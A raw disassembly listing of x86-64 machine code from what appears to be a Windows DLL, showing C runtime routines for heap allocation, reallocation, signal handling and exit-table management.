   180005e44:	48 0f 45 f9          	cmovne %rcx,%rdi
   180005e48:	48 8b 0d f9 76 00 00 	mov    0x76f9(%rip),%rcx        # 0x18000d548
   180005e4f:	48 85 c9             	test   %rcx,%rcx
   180005e52:	75 20                	jne    0x180005e74
   180005e54:	e8 db 08 00 00       	call   0x180006734
   180005e59:	b9 1e 00 00 00       	mov    $0x1e,%ecx
   180005e5e:	e8 71 06 00 00       	call   0x1800064d4
   180005e63:	b9 ff 00 00 00       	mov    $0xff,%ecx
   180005e68:	e8 53 d0 ff ff       	call   0x180002ec0
   180005e6d:	48 8b 0d d4 76 00 00 	mov    0x76d4(%rip),%rcx        # 0x18000d548
   180005e74:	4c 8b c7             	mov    %rdi,%r8
   180005e77:	33 d2                	xor    %edx,%edx
   180005e79:	ff 15 59 33 00 00    	call   *0x3359(%rip)        # 0x1800091d8
   180005e7f:	48 8b f0             	mov    %rax,%rsi
   180005e82:	48 85 c0             	test   %rax,%rax
   180005e85:	75 2c                	jne    0x180005eb3
   180005e87:	39 05 23 85 00 00    	cmp    %eax,0x8523(%rip)        # 0x18000e3b0
   180005e8d:	74 0e                	je     0x180005e9d
   180005e8f:	48 8b cb             	mov    %rbx,%rcx
   180005e92:	e8 75 04 00 00       	call   0x18000630c
   180005e97:	85 c0                	test   %eax,%eax
   180005e99:	74 0d                	je     0x180005ea8
   180005e9b:	eb ab                	jmp    0x180005e48
   180005e9d:	e8 fe c7 ff ff       	call   0x1800026a0
   180005ea2:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   180005ea8:	e8 f3 c7 ff ff       	call   0x1800026a0
   180005ead:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   180005eb3:	48 8b c6             	mov    %rsi,%rax
   180005eb6:	eb 12                	jmp    0x180005eca
   180005eb8:	e8 4f 04 00 00       	call   0x18000630c
   180005ebd:	e8 de c7 ff ff       	call   0x1800026a0
   180005ec2:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   180005ec8:	33 c0                	xor    %eax,%eax
   180005eca:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180005ecf:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180005ed4:	48 83 c4 20          	add    $0x20,%rsp
   180005ed8:	5f                   	pop    %rdi
   180005ed9:	c3                   	ret
   180005eda:	cc                   	int3
   180005edb:	cc                   	int3
   180005edc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180005ee1:	57                   	push   %rdi
   180005ee2:	48 83 ec 20          	sub    $0x20,%rsp
   180005ee6:	49 8b d8             	mov    %r8,%rbx
   180005ee9:	48 8b fa             	mov    %rdx,%rdi
   180005eec:	48 85 c9             	test   %rcx,%rcx
   180005eef:	74 1d                	je     0x180005f0e
   180005ef1:	33 d2                	xor    %edx,%edx
   180005ef3:	48 8d 42 e0          	lea    -0x20(%rdx),%rax
   180005ef7:	48 f7 f1             	div    %rcx
   180005efa:	48 3b c7             	cmp    %rdi,%rax
   180005efd:	73 0f                	jae    0x180005f0e
   180005eff:	e8 9c c7 ff ff       	call   0x1800026a0
   180005f04:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   180005f0a:	33 c0                	xor    %eax,%eax
   180005f0c:	eb 5d                	jmp    0x180005f6b
   180005f0e:	48 0f af f9          	imul   %rcx,%rdi
   180005f12:	b8 01 00 00 00       	mov    $0x1,%eax
   180005f17:	48 85 ff             	test   %rdi,%rdi
   180005f1a:	48 0f 44 f8          	cmove  %rax,%rdi
   180005f1e:	33 c0                	xor    %eax,%eax
   180005f20:	48 83 ff e0          	cmp    $0xffffffffffffffe0,%rdi
   180005f24:	77 18                	ja     0x180005f3e
   180005f26:	48 8b 0d 1b 76 00 00 	mov    0x761b(%rip),%rcx        # 0x18000d548
   180005f2d:	8d 50 08             	lea    0x8(%rax),%edx
   180005f30:	4c 8b c7             	mov    %rdi,%r8
   180005f33:	ff 15 9f 32 00 00    	call   *0x329f(%rip)        # 0x1800091d8
   180005f39:	48 85 c0             	test   %rax,%rax
   180005f3c:	75 2d                	jne    0x180005f6b
   180005f3e:	83 3d 6b 84 00 00 00 	cmpl   $0x0,0x846b(%rip)        # 0x18000e3b0
   180005f45:	74 19                	je     0x180005f60
   180005f47:	48 8b cf             	mov    %rdi,%rcx
   180005f4a:	e8 bd 03 00 00       	call   0x18000630c
   180005f4f:	85 c0                	test   %eax,%eax
   180005f51:	75 cb                	jne    0x180005f1e
   180005f53:	48 85 db             	test   %rbx,%rbx
   180005f56:	74 b2                	je     0x180005f0a
   180005f58:	c7 03 0c 00 00 00    	movl   $0xc,(%rbx)
   180005f5e:	eb aa                	jmp    0x180005f0a
   180005f60:	48 85 db             	test   %rbx,%rbx
   180005f63:	74 06                	je     0x180005f6b
   180005f65:	c7 03 0c 00 00 00    	movl   $0xc,(%rbx)
   180005f6b:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180005f70:	48 83 c4 20          	add    $0x20,%rsp
   180005f74:	5f                   	pop    %rdi
   180005f75:	c3                   	ret
   180005f76:	cc                   	int3
   180005f77:	cc                   	int3
   180005f78:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180005f7d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180005f82:	57                   	push   %rdi
   180005f83:	48 83 ec 20          	sub    $0x20,%rsp
   180005f87:	48 8b da             	mov    %rdx,%rbx
   180005f8a:	48 8b f9             	mov    %rcx,%rdi
   180005f8d:	48 85 c9             	test   %rcx,%rcx
   180005f90:	75 0a                	jne    0x180005f9c
   180005f92:	48 8b ca             	mov    %rdx,%rcx
   180005f95:	e8 8a fe ff ff       	call   0x180005e24
   180005f9a:	eb 6a                	jmp    0x180006006
   180005f9c:	48 85 d2             	test   %rdx,%rdx
   180005f9f:	75 07                	jne    0x180005fa8
   180005fa1:	e8 12 cd ff ff       	call   0x180002cb8
   180005fa6:	eb 5c                	jmp    0x180006004
   180005fa8:	48 83 fa e0          	cmp    $0xffffffffffffffe0,%rdx
   180005fac:	77 43                	ja     0x180005ff1
   180005fae:	48 8b 0d 93 75 00 00 	mov    0x7593(%rip),%rcx        # 0x18000d548
   180005fb5:	b8 01 00 00 00       	mov    $0x1,%eax
   180005fba:	48 85 db             	test   %rbx,%rbx
   180005fbd:	48 0f 44 d8          	cmove  %rax,%rbx
   180005fc1:	4c 8b c7             	mov    %rdi,%r8
   180005fc4:	33 d2                	xor    %edx,%edx
   180005fc6:	4c 8b cb             	mov    %rbx,%r9
   180005fc9:	ff 15 11 32 00 00    	call   *0x3211(%rip)        # 0x1800091e0
   180005fcf:	48 8b f0             	mov    %rax,%rsi
   180005fd2:	48 85 c0             	test   %rax,%rax
   180005fd5:	75 6f                	jne    0x180006046
   180005fd7:	39 05 d3 83 00 00    	cmp    %eax,0x83d3(%rip)        # 0x18000e3b0
   180005fdd:	74 50                	je     0x18000602f
   180005fdf:	48 8b cb             	mov    %rbx,%rcx
   180005fe2:	e8 25 03 00 00       	call   0x18000630c
   180005fe7:	85 c0                	test   %eax,%eax
   180005fe9:	74 2b                	je     0x180006016
   180005feb:	48 83 fb e0          	cmp    $0xffffffffffffffe0,%rbx
   180005fef:	76 bd                	jbe    0x180005fae
   180005ff1:	48 8b cb             	mov    %rbx,%rcx
   180005ff4:	e8 13 03 00 00       	call   0x18000630c
   180005ff9:	e8 a2 c6 ff ff       	call   0x1800026a0
   180005ffe:	c7 00 0c 00 00 00    	movl   $0xc,(%rax)
   180006004:	33 c0                	xor    %eax,%eax
   180006006:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000600b:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180006010:	48 83 c4 20          	add    $0x20,%rsp
   180006014:	5f                   	pop    %rdi
   180006015:	c3                   	ret
   180006016:	e8 85 c6 ff ff       	call   0x1800026a0
   18000601b:	48 8b d8             	mov    %rax,%rbx
   18000601e:	ff 15 a4 30 00 00    	call   *0x30a4(%rip)        # 0x1800090c8
   180006024:	8b c8                	mov    %eax,%ecx
   180006026:	e8 2d c6 ff ff       	call   0x180002658
   18000602b:	89 03                	mov    %eax,(%rbx)
   18000602d:	eb d5                	jmp    0x180006004
   18000602f:	e8 6c c6 ff ff       	call   0x1800026a0
   180006034:	48 8b d8             	mov    %rax,%rbx
   180006037:	ff 15 8b 30 00 00    	call   *0x308b(%rip)        # 0x1800090c8
   18000603d:	8b c8                	mov    %eax,%ecx
   18000603f:	e8 14 c6 ff ff       	call   0x180002658
   180006044:	89 03                	mov    %eax,(%rbx)
   180006046:	48 8b c6             	mov    %rsi,%rax
   180006049:	eb bb                	jmp    0x180006006
   18000604b:	cc                   	int3
   18000604c:	48 83 ec 28          	sub    $0x28,%rsp
   180006050:	e8 47 ca ff ff       	call   0x180002a9c
   180006055:	48 8b 88 d0 00 00 00 	mov    0xd0(%rax),%rcx
   18000605c:	48 85 c9             	test   %rcx,%rcx
   18000605f:	74 04                	je     0x180006065
   180006061:	ff d1                	call   *%rcx
   180006063:	eb 00                	jmp    0x180006065
   180006065:	e8 26 1e 00 00       	call   0x180007e90
   18000606a:	48 83 c4 28          	add    $0x28,%rsp
   18000606e:	c3                   	ret
   18000606f:	cc                   	int3
   180006070:	48 83 ec 28          	sub    $0x28,%rsp
   180006074:	48 8d 0d d1 ff ff ff 	lea    -0x2f(%rip),%rcx        # 0x18000604c
   18000607b:	ff 15 0f 30 00 00    	call   *0x300f(%rip)        # 0x180009090
   180006081:	48 89 05 28 77 00 00 	mov    %rax,0x7728(%rip)        # 0x18000d7b0
   180006088:	48 83 c4 28          	add    $0x28,%rsp
   18000608c:	c3                   	ret
   18000608d:	cc                   	int3
   18000608e:	cc                   	int3
   18000608f:	cc                   	int3
   180006090:	48 89 0d 21 77 00 00 	mov    %rcx,0x7721(%rip)        # 0x18000d7b8
   180006097:	48 89 0d 22 77 00 00 	mov    %rcx,0x7722(%rip)        # 0x18000d7c0
   18000609e:	48 89 0d 23 77 00 00 	mov    %rcx,0x7723(%rip)        # 0x18000d7c8
   1800060a5:	48 89 0d 24 77 00 00 	mov    %rcx,0x7724(%rip)        # 0x18000d7d0
   1800060ac:	c3                   	ret
   1800060ad:	cc                   	int3
   1800060ae:	cc                   	int3
   1800060af:	cc                   	int3
   1800060b0:	48 8b 0d 11 77 00 00 	mov    0x7711(%rip),%rcx        # 0x18000d7c8
   1800060b7:	48 ff 25 9a 2f 00 00 	rex.W jmp *0x2f9a(%rip)        # 0x180009058
   1800060be:	cc                   	int3
   1800060bf:	cc                   	int3
   1800060c0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1800060c5:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1800060ca:	57                   	push   %rdi
   1800060cb:	41 54                	push   %r12
   1800060cd:	41 55                	push   %r13
   1800060cf:	41 56                	push   %r14
   1800060d1:	41 57                	push   %r15
   1800060d3:	48 83 ec 30          	sub    $0x30,%rsp
   1800060d7:	8b d9                	mov    %ecx,%ebx
   1800060d9:	33 ff                	xor    %edi,%edi
   1800060db:	89 7c 24 60          	mov    %edi,0x60(%rsp)
   1800060df:	33 f6                	xor    %esi,%esi
   1800060e1:	8b d1                	mov    %ecx,%edx
   1800060e3:	83 ea 02             	sub    $0x2,%edx
   1800060e6:	0f 84 c5 00 00 00    	je     0x1800061b1
   1800060ec:	83 ea 02             	sub    $0x2,%edx
   1800060ef:	74 62                	je     0x180006153
   1800060f1:	83 ea 02             	sub    $0x2,%edx
   1800060f4:	74 4d                	je     0x180006143
   1800060f6:	83 ea 02             	sub    $0x2,%edx
   1800060f9:	74 58                	je     0x180006153
   1800060fb:	83 ea 03             	sub    $0x3,%edx
   1800060fe:	74 53                	je     0x180006153
   180006100:	83 ea 04             	sub    $0x4,%edx
   180006103:	74 2e                	je     0x180006133
   180006105:	83 ea 06             	sub    $0x6,%edx
   180006108:	74 16                	je     0x180006120
   18000610a:	ff ca                	dec    %edx
   18000610c:	74 35                	je     0x180006143
   18000610e:	e8 8d c5 ff ff       	call   0x1800026a0
   180006113:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   180006119:	e8 1a c5 ff ff       	call   0x180002638
   18000611e:	eb 40                	jmp    0x180006160
   180006120:	4c 8d 25 99 76 00 00 	lea    0x7699(%rip),%r12        # 0x18000d7c0
   180006127:	48 8b 0d 92 76 00 00 	mov    0x7692(%rip),%rcx        # 0x18000d7c0
   18000612e:	e9 8c 00 00 00       	jmp    0x1800061bf
   180006133:	4c 8d 25 96 76 00 00 	lea    0x7696(%rip),%r12        # 0x18000d7d0
   18000613a:	48 8b 0d 8f 76 00 00 	mov    0x768f(%rip),%rcx        # 0x18000d7d0
   180006141:	eb 7c                	jmp    0x1800061bf
   180006143:	4c 8d 25 7e 76 00 00 	lea    0x767e(%rip),%r12        # 0x18000d7c8
   18000614a:	48 8b 0d 77 76 00 00 	mov    0x7677(%rip),%rcx        # 0x18000d7c8
   180006151:	eb 6c                	jmp    0x1800061bf
   180006153:	e8 c0 c8 ff ff       	call   0x180002a18
   180006158:	48 8b f0             	mov    %rax,%rsi
   18000615b:	48 85 c0             	test   %rax,%rax
   18000615e:	75 08                	jne    0x180006168
   180006160:	83 c8 ff             	or     $0xffffffff,%eax
   180006163:	e9 72 01 00 00       	jmp    0x1800062da
   180006168:	48 8b 90 a0 00 00 00 	mov    0xa0(%rax),%rdx
   18000616f:	48 8b ca             	mov    %rdx,%rcx
   180006172:	4c 63 05 e3 32 00 00 	movslq 0x32e3(%rip),%r8        # 0x18000945c
   180006179:	39 59 04             	cmp    %ebx,0x4(%rcx)
   18000617c:	74 13                	je     0x180006191
   18000617e:	48 83 c1 10          	add    $0x10,%rcx
   180006182:	49 8b c0             	mov    %r8,%rax
   180006185:	48 c1 e0 04          	shl    $0x4,%rax
   180006189:	48 03 c2             	add    %rdx,%rax
   18000618c:	48 3b c8             	cmp    %rax,%rcx
   18000618f:	72 e8                	jb     0x180006179
   180006191:	49 8b c0             	mov    %r8,%rax
   180006194:	48 c1 e0 04          	shl    $0x4,%rax
   180006198:	48 03 c2             	add    %rdx,%rax
   18000619b:	48 3b c8             	cmp    %rax,%rcx
   18000619e:	73 05                	jae    0x1800061a5
   1800061a0:	39 59 04             	cmp    %ebx,0x4(%rcx)
   1800061a3:	74 02                	je     0x1800061a7
   1800061a5:	33 c9                	xor    %ecx,%ecx
   1800061a7:	4c 8d 61 08          	lea    0x8(%rcx),%r12
   1800061ab:	4d 8b 2c 24          	mov    (%r12),%r13
   1800061af:	eb 20                	jmp    0x1800061d1
   1800061b1:	4c 8d 25 00 76 00 00 	lea    0x7600(%rip),%r12        # 0x18000d7b8
   1800061b8:	48 8b 0d f9 75 00 00 	mov    0x75f9(%rip),%rcx        # 0x18000d7b8
   1800061bf:	bf 01 00 00 00       	mov    $0x1,%edi
   1800061c4:	89 7c 24 60          	mov    %edi,0x60(%rsp)
   1800061c8:	ff 15 8a 2e 00 00    	call   *0x2e8a(%rip)        # 0x180009058
   1800061ce:	4c 8b e8             	mov    %rax,%r13
   1800061d1:	49 83 fd 01          	cmp    $0x1,%r13
   1800061d5:	75 07                	jne    0x1800061de
   1800061d7:	33 c0                	xor    %eax,%eax
   1800061d9:	e9 fc 00 00 00       	jmp    0x1800062da
   1800061de:	4d 85 ed             	test   %r13,%r13
   1800061e1:	75 0a                	jne    0x1800061ed
   1800061e3:	41 8d 4d 03          	lea    0x3(%r13),%ecx
   1800061e7:	e8 f8 cf ff ff       	call   0x1800031e4
   1800061ec:	cc                   	int3
   1800061ed:	85 ff                	test   %edi,%edi
   1800061ef:	74 08                	je     0x1800061f9
   1800061f1:	33 c9                	xor    %ecx,%ecx
   1800061f3:	e8 e8 fb ff ff       	call   0x180005de0
   1800061f8:	90                   	nop
   1800061f9:	83 fb 08             	cmp    $0x8,%ebx
   1800061fc:	74 11                	je     0x18000620f
   1800061fe:	83 fb 0b             	cmp    $0xb,%ebx
   180006201:	74 0c                	je     0x18000620f
   180006203:	83 fb 04             	cmp    $0x4,%ebx
   180006206:	74 07                	je     0x18000620f
   180006208:	4c 8b 7c 24 28       	mov    0x28(%rsp),%r15
   18000620d:	eb 2c                	jmp    0x18000623b
   18000620f:	4c 8b be a8 00 00 00 	mov    0xa8(%rsi),%r15
   180006216:	4c 89 7c 24 28       	mov    %r15,0x28(%rsp)
   18000621b:	48 83 a6 a8 00 00 00 	andq   $0x0,0xa8(%rsi)
   180006222:	00 
   180006223:	83 fb 08             	cmp    $0x8,%ebx
   180006226:	75 13                	jne    0x18000623b
   180006228:	44 8b b6 b0 00 00 00 	mov    0xb0(%rsi),%r14d
   18000622f:	c7 86 b0 00 00 00 8c 	movl   $0x8c,0xb0(%rsi)
   180006236:	00 00 00 
   180006239:	eb 05                	jmp    0x180006240
   18000623b:	44 8b 74 24 60       	mov    0x60(%rsp),%r14d
   180006240:	83 fb 08             	cmp    $0x8,%ebx
   180006243:	75 39                	jne    0x18000627e
   180006245:	8b 0d 05 32 00 00    	mov    0x3205(%rip),%ecx        # 0x180009450
   18000624b:	8b d1                	mov    %ecx,%edx
   18000624d:	89 4c 24 20          	mov    %ecx,0x20(%rsp)
   180006251:	8b 05 fd 31 00 00    	mov    0x31fd(%rip),%eax        # 0x180009454
   180006257:	03 c8                	add    %eax,%ecx
   180006259:	3b d1                	cmp    %ecx,%edx
   18000625b:	7d 2a                	jge    0x180006287
   18000625d:	48 63 ca             	movslq %edx,%rcx
   180006260:	48 03 c9             	add    %rcx,%rcx
   180006263:	48 8b 86 a0 00 00 00 	mov    0xa0(%rsi),%rax
   18000626a:	48 83 64 c8 08 00    	andq   $0x0,0x8(%rax,%rcx,8)
   180006270:	ff c2                	inc    %edx
   180006272:	89 54 24 20          	mov    %edx,0x20(%rsp)
   180006276:	8b 0d d4 31 00 00    	mov    0x31d4(%rip),%ecx        # 0x180009450
   18000627c:	eb d3                	jmp    0x180006251
   18000627e:	e8 a5 c6 ff ff       	call   0x180002928
   180006283:	49 89 04 24          	mov    %rax,(%r12)
   180006287:	85 ff                	test   %edi,%edi
   180006289:	74 07                	je     0x180006292
   18000628b:	33 c9                	xor    %ecx,%ecx
   18000628d:	e8 4e fa ff ff       	call   0x180005ce0
   180006292:	bf 08 00 00 00       	mov    $0x8,%edi
   180006297:	3b df                	cmp    %edi,%ebx
   180006299:	75 0d                	jne    0x1800062a8
   18000629b:	8b 96 b0 00 00 00    	mov    0xb0(%rsi),%edx
   1800062a1:	8b cf                	mov    %edi,%ecx
   1800062a3:	41 ff d5             	call   *%r13
   1800062a6:	eb 05                	jmp    0x1800062ad
   1800062a8:	8b cb                	mov    %ebx,%ecx
   1800062aa:	41 ff d5             	call   *%r13
   1800062ad:	3b df                	cmp    %edi,%ebx
   1800062af:	74 0e                	je     0x1800062bf
   1800062b1:	83 fb 0b             	cmp    $0xb,%ebx
   1800062b4:	74 09                	je     0x1800062bf
   1800062b6:	83 fb 04             	cmp    $0x4,%ebx
   1800062b9:	0f 85 18 ff ff ff    	jne    0x1800061d7
   1800062bf:	4c 89 be a8 00 00 00 	mov    %r15,0xa8(%rsi)
   1800062c6:	3b df                	cmp    %edi,%ebx
   1800062c8:	0f 85 09 ff ff ff    	jne    0x1800061d7
   1800062ce:	44 89 b6 b0 00 00 00 	mov    %r14d,0xb0(%rsi)
   1800062d5:	e9 fd fe ff ff       	jmp    0x1800061d7
   1800062da:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   1800062df:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   1800062e4:	48 83 c4 30          	add    $0x30,%rsp
   1800062e8:	41 5f                	pop    %r15
   1800062ea:	41 5e                	pop    %r14
   1800062ec:	41 5d                	pop    %r13
   1800062ee:	41 5c                	pop    %r12
   1800062f0:	5f                   	pop    %rdi
   1800062f1:	c3                   	ret
   1800062f2:	cc                   	int3
   1800062f3:	cc                   	int3
   1800062f4:	48 89 0d e5 74 00 00 	mov    %rcx,0x74e5(%rip)        # 0x18000d7e0
   1800062fb:	c3                   	ret
   1800062fc:	48 89 0d e5 74 00 00 	mov    %rcx,0x74e5(%rip)        # 0x18000d7e8
   180006303:	c3                   	ret
   180006304:	48 89 0d e5 74 00 00 	mov    %rcx,0x74e5(%rip)        # 0x18000d7f0
   18000630b:	c3                   	ret
   18000630c:	40 53                	rex push %rbx
   18000630e:	48 83 ec 20          	sub    $0x20,%rsp
   180006312:	48 8b d9             	mov    %rcx,%rbx
   180006315:	48 8b 0d d4 74 00 00 	mov    0x74d4(%rip),%rcx        # 0x18000d7f0
   18000631c:	ff 15 36 2d 00 00    	call   *0x2d36(%rip)        # 0x180009058
   180006322:	48 85 c0             	test   %rax,%rax
   180006325:	74 10                	je     0x180006337
   180006327:	48 8b cb             	mov    %rbx,%rcx
   18000632a:	ff d0                	call   *%rax
   18000632c:	85 c0                	test   %eax,%eax
   18000632e:	74 07                	je     0x180006337
   180006330:	b8 01 00 00 00       	mov    $0x1,%eax
   180006335:	eb 02                	jmp    0x180006339
   180006337:	33 c0                	xor    %eax,%eax
   180006339:	48 83 c4 20          	add    $0x20,%rsp
   18000633d:	5b                   	pop    %rbx
   18000633e:	c3                   	ret
   18000633f:	cc                   	int3
   180006340:	40 53                	rex push %rbx
   180006342:	48 83 ec 20          	sub    $0x20,%rsp
   180006346:	ba 08 00 00 00       	mov    $0x8,%edx
   18000634b:	8d 4a 18             	lea    0x18(%rdx),%ecx
   18000634e:	e8 25 ca ff ff       	call   0x180002d78
   180006353:	48 8b c8             	mov    %rax,%rcx
   180006356:	48 8b d8             	mov    %rax,%rbx
   180006359:	ff 15 31 2d 00 00    	call   *0x2d31(%rip)        # 0x180009090
   18000635f:	48 89 05 ca 92 00 00 	mov    %rax,0x92ca(%rip)        # 0x18000f630
   180006366:	48 89 05 bb 92 00 00 	mov    %rax,0x92bb(%rip)        # 0x18000f628
   18000636d:	48 85 db             	test   %rbx,%rbx
   180006370:	75 05                	jne    0x180006377
   180006372:	8d 43 18             	lea    0x18(%rbx),%eax
   180006375:	eb 06                	jmp    0x18000637d
   180006377:	48 83 23 00          	andq   $0x0,(%rbx)
   18000637b:	33 c0                	xor    %eax,%eax
   18000637d:	48 83 c4 20          	add    $0x20,%rsp
   180006381:	5b                   	pop    %rbx
   180006382:	c3                   	ret
   180006383:	cc                   	int3
   180006384:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180006389:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   18000638e:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   180006393:	41 54                	push   %r12
   180006395:	41 55                	push   %r13
   180006397:	41 56                	push   %r14
   180006399:	48 83 ec 20          	sub    $0x20,%rsp
   18000639d:	4c 8b f1             	mov    %rcx,%r14
   1800063a0:	e8 33 cb ff ff       	call   0x180002ed8
   1800063a5:	90                   	nop
   1800063a6:	48 8b 0d 83 92 00 00 	mov    0x9283(%rip),%rcx        # 0x18000f630
   1800063ad:	ff 15 a5 2c 00 00    	call   *0x2ca5(%rip)        # 0x180009058
   1800063b3:	4c 8b e0             	mov    %rax,%r12
   1800063b6:	48 8b 0d 6b 92 00 00 	mov    0x926b(%rip),%rcx        # 0x18000f628
   1800063bd:	ff 15 95 2c 00 00    	call   *0x2c95(%rip)        # 0x180009058
   1800063c3:	48 8b d8             	mov    %rax,%rbx
   1800063c6:	49 3b c4             	cmp    %r12,%rax
   1800063c9:	0f 82 9b 00 00 00    	jb     0x18000646a
   1800063cf:	48 8b f8             	mov    %rax,%rdi
   1800063d2:	49 2b fc             	sub    %r12,%rdi
   1800063d5:	4c 8d 6f 08          	lea    0x8(%rdi),%r13
   1800063d9:	49 83 fd 08          	cmp    $0x8,%r13
   1800063dd:	0f 82 87 00 00 00    	jb     0x18000646a
   1800063e3:	49 8b cc             	mov    %r12,%rcx
   1800063e6:	e8 69 1a 00 00       	call   0x180007e54
   1800063eb:	48 8b f0             	mov    %rax,%rsi
   1800063ee:	49 3b c5             	cmp    %r13,%rax
   1800063f1:	73 55                	jae    0x180006448
   1800063f3:	ba 00 10 00 00       	mov    $0x1000,%edx
   1800063f8:	48 3b c2             	cmp    %rdx,%rax
   1800063fb:	48 0f 42 d0          	cmovb  %rax,%rdx
   1800063ff:	48 03 d0             	add    %rax,%rdx
   180006402:	48 3b d0             	cmp    %rax,%rdx
   180006405:	72 11                	jb     0x180006418
   180006407:	49 8b cc             	mov    %r12,%rcx
   18000640a:	e8 ed c9 ff ff       	call   0x180002dfc
   18000640f:	33 db                	xor    %ebx,%ebx
   180006411:	48 85 c0             	test   %rax,%rax
   180006414:	75 1a                	jne    0x180006430
   180006416:	eb 02                	jmp    0x18000641a
   180006418:	33 db                	xor    %ebx,%ebx
   18000641a:	48 8d 56 20          	lea    0x20(%rsi),%rdx
   18000641e:	48 3b d6             	cmp    %rsi,%rdx
   180006421:	72 49                	jb     0x18000646c
   180006423:	49 8b cc             	mov    %r12,%rcx
   180006426:	e8 d1 c9 ff ff       	call   0x180002dfc
   18000642b:	48 85 c0             	test   %rax,%rax
   18000642e:	74 3c                	je     0x18000646c
   180006430:	48 c1 ff 03          	sar    $0x3,%rdi
   180006434:	48 8d 1c f8          	lea    (%rax,%rdi,8),%rbx
   180006438:	48 8b c8             	mov    %rax,%rcx
   18000643b:	ff 15 4f 2c 00 00    	call   *0x2c4f(%rip)        # 0x180009090
   180006441:	48 89 05 e8 91 00 00 	mov    %rax,0x91e8(%rip)        # 0x18000f630
   180006448:	49 8b ce             	mov    %r14,%rcx
   18000644b:	ff 15 3f 2c 00 00    	call   *0x2c3f(%rip)        # 0x180009090
   180006451:	48 89 03             	mov    %rax,(%rbx)
   180006454:	48 8d 4b 08          	lea    0x8(%rbx),%rcx
   180006458:	ff 15 32 2c 00 00    	call   *0x2c32(%rip)        # 0x180009090
   18000645e:	48 89 05 c3 91 00 00 	mov    %rax,0x91c3(%rip)        # 0x18000f628
   180006465:	49 8b de             	mov    %r14,%rbx
   180006468:	eb 02                	jmp    0x18000646c
   18000646a:	33 db                	xor    %ebx,%ebx
   18000646c:	e8 73 ca ff ff       	call   0x180002ee4
   180006471:	48 8b c3             	mov    %rbx,%rax
   180006474:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   180006479:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   18000647e:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   180006483:	48 83 c4 20          	add    $0x20,%rsp
   180006487:	41 5e                	pop    %r14
   180006489:	41 5d                	pop    %r13
   18000648b:	41 5c                	pop    %r12
   18000648d:	c3                   	ret
   18000648e:	cc                   	int3
   18000648f:	cc                   	int3
   180006490:	48 83 ec 28          	sub    $0x28,%rsp
   180006494:	e8 eb fe ff ff       	call   0x180006384
   180006499:	48 f7 d8             	neg    %rax
   18000649c:	1b c0                	sbb    %eax,%eax
   18000649e:	f7 d8                	neg    %eax
   1800064a0:	ff c8                	dec    %eax
   1800064a2:	48 83 c4 28          	add    $0x28,%rsp
   1800064a6:	c3                   	ret
   1800064a7:	cc                   	int3
   1800064a8:	4c 8d 05 91 3c 00 00 	lea    0x3c91(%rip),%r8        # 0x18000a140
   1800064af:	33 c0                	xor    %eax,%eax
   1800064b1:	49 8b d0             	mov    %r8,%rdx
   1800064b4:	3b 0a                	cmp    (%rdx),%ecx
   1800064b6:	74 0e                	je     0x1800064c6
   1800064b8:	ff c0                	inc    %eax
   1800064ba:	48 83 c2 10          	add    $0x10,%rdx
   1800064be:	83 f8 16             	cmp    $0x16,%eax
   1800064c1:	72 f1                	jb     0x1800064b4
   1800064c3:	33 c0                	xor    %eax,%eax
   1800064c5:	c3                   	ret
   1800064c6:	48 98                	cltq
   1800064c8:	48 03 c0             	add    %rax,%rax
   1800064cb:	49 8b 44 c0 08       	mov    0x8(%r8,%rax,8),%rax
   1800064d0:	c3                   	ret
   1800064d1:	cc                   	int3
   1800064d2:	cc                   	int3
   1800064d3:	cc                   	int3
   1800064d4:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1800064d9:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   1800064de:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1800064e3:	57                   	push   %rdi
   1800064e4:	41 54                	push   %r12
   1800064e6:	41 55                	push   %r13
   1800064e8:	48 81 ec 50 02 00 00 	sub    $0x250,%rsp
   1800064ef:	48 8b 05 7a 6a 00 00 	mov    0x6a7a(%rip),%rax        # 0x18000cf70
   1800064f6:	48 33 c4             	xor    %rsp,%rax
   1800064f9:	48 89 84 24 40 02 00 	mov    %rax,0x240(%rsp)
   180006500:	00 
   180006501:	8b f9                	mov    %ecx,%edi
   180006503:	e8 a0 ff ff ff       	call   0x1800064a8
   180006508:	33 f6                	xor    %esi,%esi
   18000650a:	48 8b d8             	mov    %rax,%rbx
   18000650d:	48 85 c0             	test   %rax,%rax
   180006510:	0f 84 ee 01 00 00    	je     0x180006704
   180006516:	8d 4e 03             	lea    0x3(%rsi),%ecx
   180006519:	e8 9a 1d 00 00       	call   0x1800082b8
   18000651e:	83 f8 01             	cmp    $0x1,%eax
   180006521:	0f 84 75 01 00 00    	je     0x18000669c
   180006527:	8d 4e 03             	lea    0x3(%rsi),%ecx
   18000652a:	e8 89 1d 00 00       	call   0x1800082b8
   18000652f:	85 c0                	test   %eax,%eax
   180006531:	75 0d                	jne    0x180006540
   180006533:	83 3d 8e 6e 00 00 01 	cmpl   $0x1,0x6e8e(%rip)        # 0x18000d3c8
   18000653a:	0f 84 5c 01 00 00    	je     0x18000669c
   180006540:	81 ff fc 00 00 00    	cmp    $0xfc,%edi
   180006546:	0f 84 b8 01 00 00    	je     0x180006704
